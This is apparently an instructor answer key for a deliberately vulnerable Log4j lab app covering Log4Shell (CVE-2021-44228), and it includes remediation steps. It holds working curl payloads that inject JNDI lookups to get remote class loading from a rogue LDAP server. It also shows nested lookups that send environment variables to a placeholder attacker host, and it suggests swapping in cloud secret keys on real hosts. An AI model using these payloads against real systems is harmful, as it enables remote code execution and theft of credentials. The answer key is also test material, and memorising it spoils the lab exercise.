# Log4Shell vulnerabilities

Answer key for the **log4shell** target. The single flaw is unlabelled in the app;
this document is for maintainers and instructors. This is a minimal Spring app that
bundles a vulnerable Log4j 2.x, so it follows the documented CVE-2021-44228 behaviour.

> **Intentionally vulnerable. Isolated testing only.** Do not run log4shell
> anywhere it can be reached from an untrusted network.

- **App:** minimal Spring Boot app on a vulnerable Log4j 2.x (Java)
- **Start:** `./vam start log4shell`
- **URL:** `http://127.0.0.1:7009`
- **No login.** The app logs the `X-Api-Version` request header through Log4j, which
  is the injection sink.
- **OOB catcher:** point payloads at an out-of-band listener you control - WebWolf
  (`http://127.0.0.1:7004/WebWolf`), a managed OAST endpoint, or a
  marshalsec / rogue-JNDI LDAP server for full class loading. This is the cleanest
  blind-RCE -> OAST test in the fleet.

Status legend:

- **Live** - reachable and exploitable in the running app. (Both items are Live.)

## Summary

| ID | Vulnerability | Category | Status |
|----|---------------|----------|--------|
| LS1 | JNDI lookup injection (CVE-2021-44228, RCE) | Injection / RCE | Live |
| LS2 | Blind OOB data exfiltration via lookup nesting | Data Exposure (OOB) | Live |

## Vulnerabilities

### LS1 - JNDI lookup injection (CVE-2021-44228, "Log4Shell")

- **Where:** any request; the `X-Api-Version` header value is passed to
  `logger.info(...)`. Log4j 2.x (<= 2.14.1) evaluates `${jndi:...}` message lookups
  and performs the JNDI request.
- **Reproduce:**
  ```
  curl http://127.0.0.1:7009/ -H 'X-Api-Version: ${jndi:ldap://<your-oast-host>/a}'
  ```
  Log4j resolves the lookup and makes an outbound LDAP/DNS request to your host.
  Catch it on your OAST/DNS listener to confirm the blind callback; to escalate to
  RCE, serve a malicious class from a marshalsec / rogue-JNDI LDAP server so the JVM
  loads and executes it. `${jndi:dns://...}` or `${jndi:rmi://...}` work as
  alternate protocols.
- **Real-world fix:** upgrade Log4j to >= 2.17.1; remove the `JndiLookup` class from
  the classpath (`zip -q -d log4j-core-*.jar
  org/apache/logging/log4j/core/lookup/JndiLookup.class`); for <= 2.14.1 set
  `-Dlog4j2.formatMsgNoLookups=true` / `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`; and
  restrict outbound network egress.

### LS2 - Blind OOB data exfiltration via lookup nesting

- **Where:** the same logging sink. Log4j expands nested lookups such as
  `${env:...}`, `${sys:...}`, and `${java:...}` inside the JNDI URL before it makes
  the DNS/LDAP request, so their values become part of the hostname.
- **Reproduce:**
  ```
  curl http://127.0.0.1:7009/ -H 'X-Api-Version: ${jndi:ldap://${env:USER}.${sys:java.version}.<your-oast-host>/a}'
  ```
  The environment variable and system property are prepended as DNS labels and
  leak to your OAST/DNS listener even though the HTTP response reveals nothing -
  a pure blind out-of-band exfiltration channel (swap in `AWS_SECRET_ACCESS_KEY`,
  `AWS_SESSION_TOKEN`, etc. on a real host).
- **Real-world fix:** same remediation as LS1; additionally scrub secrets from the
  process environment and block egress DNS so exfiltration cannot leave the host.

## Notes and scope

The authoritative reference is the CVE-2021-44228 advisory and the Apache Log4j
Security page (logging.apache.org/log4j/2.x/security.html), which document the
affected versions and the JndiLookup mechanism. The header the app logs
(`X-Api-Version`) is the only sink here; on real targets the injectable field is
often a User-Agent, form value, or username. Keep this file aligned with the Log4j
version pinned in `apps/log4shell/app.yml`.
